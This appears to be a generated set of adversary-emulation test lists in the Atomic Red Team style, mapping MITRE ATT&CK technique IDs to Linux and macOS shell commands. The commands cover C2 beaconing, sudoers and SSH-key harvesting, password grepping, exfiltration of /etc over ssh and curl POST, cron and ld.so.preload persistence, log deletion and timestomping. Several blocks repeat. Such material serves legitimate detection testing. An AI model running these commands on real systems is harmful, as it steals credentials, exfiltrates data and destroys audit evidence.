T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1215 ,T1154 ,T1081 ,T1018 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1168 ,T1064 ,T1081 ,T1082 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1154 ,T1145 ,T1201 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}

